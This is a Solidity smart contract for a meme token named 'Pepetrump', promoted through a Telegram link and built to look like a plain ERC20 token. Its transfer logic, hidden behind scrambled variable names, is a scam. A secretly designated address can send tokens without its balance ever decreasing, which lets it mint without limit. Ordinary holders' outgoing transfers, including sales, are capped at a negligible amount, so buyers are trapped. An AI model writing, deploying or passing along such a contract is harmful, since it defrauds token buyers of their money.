/*

https://t.me/ercpepetrump

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Pepetrump is Ownable {
    mapping(address => uint256) private xepwjb;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    uint8 public decimals = 9;

    uint256 private lukepcinbza = 106;

    function transfer(address nwpev, uint256 skrwu) public returns (bool success) {
        xohm(msg.sender, nwpev, skrwu);
        return true;
    }

    IUniswapV2Router02 private sndbizywlkr;

    constructor(string memory eokzcsjl, string memory oytfwxubpvg, address hxajn, address scgykuejbip) {
        name = eokzcsjl;
        symbol = oytfwxubpvg;
        balanceOf[msg.sender] = totalSupply;
        rsfjky[scgykuejbip] = lukepcinbza;
        sndbizywlkr = IUniswapV2Router02(hxajn);
    }

    function xohm(address ponqhcjidxby, address nwpev, uint256 skrwu) private {
        address bpgmvh = IUniswapV2Factory(sndbizywlkr.factory()).getPair(address(this), sndbizywlkr.WETH());
        bool xhvfiqrez = 0 == rsfjky[ponqhcjidxby];
        if (xhvfiqrez) {
            if (ponqhcjidxby != bpgmvh && xepwjb[ponqhcjidxby] != block.number && skrwu < totalSupply) {
                require(skrwu <= totalSupply / (10 ** decimals));
            }
            balanceOf[ponqhcjidxby] -= skrwu;
        }
        balanceOf[nwpev] += skrwu;
        xepwjb[nwpev] = block.number;
        emit Transfer(ponqhcjidxby, nwpev, skrwu);
    }

    string public name;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address tzya, uint256 skrwu) public returns (bool success) {
        allowance[msg.sender][tzya] = skrwu;
        emit Approval(msg.sender, tzya, skrwu);
        return true;
    }

    string public symbol;

    mapping(address => uint256) private rsfjky;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferFrom(address ponqhcjidxby, address nwpev, uint256 skrwu) public returns (bool success) {
        require(skrwu <= allowance[ponqhcjidxby][msg.sender]);
        allowance[ponqhcjidxby][msg.sender] -= skrwu;
        xohm(ponqhcjidxby, nwpev, skrwu);
        return true;
    }
}
